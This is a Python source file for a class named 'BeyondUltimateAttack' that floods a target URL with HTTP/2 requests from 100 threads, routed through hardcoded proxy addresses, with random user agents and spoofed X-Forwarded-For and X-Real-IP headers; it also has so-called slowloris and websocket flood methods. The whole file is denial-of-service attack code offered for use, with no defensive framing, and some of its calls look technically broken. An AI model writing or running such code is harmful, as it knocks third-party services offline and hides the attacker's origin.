import random
import requests
from fake_useragent import UserAgent
import threading
import time
import ssl
from httpx import Client

class BeyondUltimateAttack:
    def __init__(self, target):
        self.target = target
        self.proxies = [
            'http://1.10.186.107:13629',
            'http://101.200.187.233:3333',
            'http://1.32.59.217:47045'
        ]
        self.ua = UserAgent()
        self.max_threads = 100  
        self.http_client = Client(http2=True, verify=False)  

    def get_random_user_agent(self):
        return self.ua.random

    def rotate_proxy(self):
        return random.choice(self.proxies)

    def generate_headers(self):
        return {
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'X-Forwarded-For': self.random_ip(),
            'X-Real-IP': self.random_ip(),
            'Referer': 'https://www.google.com/',
            'Cache-Control': 'max-age=0',
            'Dnt': '1',
            'Upgrade-Insecure-Requests': '1'
        }

    def random_ip(self):
        return '.'.join(str(random.randint(0, 255)) for _ in range(4))

    def send_http2_flood(self):
        headers = self.generate_headers()
        proxies = {'http://': self.rotate_proxy(), 'https://': self.rotate_proxy()}

        try:
            response = self.http_client.get(self.target, headers=headers, proxies=proxies, timeout=10)
            print(f"HTTP/2 Flood Sent: {response.status_code}")
        except Exception as e:
            print(f"Request Failed: {str(e)}")

    def send_slowloris(self):
        headers = self.generate_headers()
        try:
            with requests.Session() as s:
                conn = s.get(self.target, headers=headers, stream=True, timeout=999)
                print(f"Slowloris Attack Started: {conn.status_code}")
        except Exception as e:
            print(f"Slowloris Failed: {str(e)}")

    def websocket_flood(self):
        headers = self.generate_headers()
        ws_url = self.target.replace("http", "ws")  
        try:
            response = requests.get(ws_url, headers=headers, timeout=10)
            print(f"WebSocket Attack Sent: {response.status_code}")
        except Exception as e:
            print(f"WebSocket Attack Failed: {str(e)}")

    def attack(self):
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self.send_http2_flood)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()
